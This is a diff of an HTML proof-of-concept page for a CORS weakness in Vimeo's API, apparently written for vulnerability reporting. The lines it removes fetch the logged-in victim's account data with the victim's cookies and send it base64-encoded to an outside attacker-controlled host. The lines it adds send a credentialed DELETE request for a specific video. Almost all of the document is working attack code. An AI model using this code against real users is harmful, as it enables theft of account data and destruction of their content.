@@ -1,24 +1,19 @@
 <!DOCTYPE html>
 <html>
 <body>
-<h1>CORS Data Theft PoC</h1>
-<pre id="output"></pre>
+<h1>CORS Destructive Action PoC</h1>
 <script>
 (async () => {
   try {
-    // Grab victim’s account info
-    const resp = await fetch("https://api.vimeo.com/me", {
+    // Replace 123456 with a real video ID from your test account
+    const resp = await fetch("https://api.vimeo.com/videos/1109902013", {
+      method: "DELETE",
       credentials: "include"
     });
-    const text = await resp.text();
 
-    // Show it on screen (proof you can read it)
-    document.getElementById("output").innerText = text;
-
-    // Exfiltrate to attacker server (replace with your endpoint)
-    await fetch("https://russianyandexshop.github.io/view/log?d=" + encodeURIComponent(btoa(text)));
+    alert("DELETE request sent! Status: " + resp.status);
   } catch (e) {
-    document.getElementById("output").innerText = "Error: " + e;
+    alert("Error: " + e);
   }
 })();
 </script>
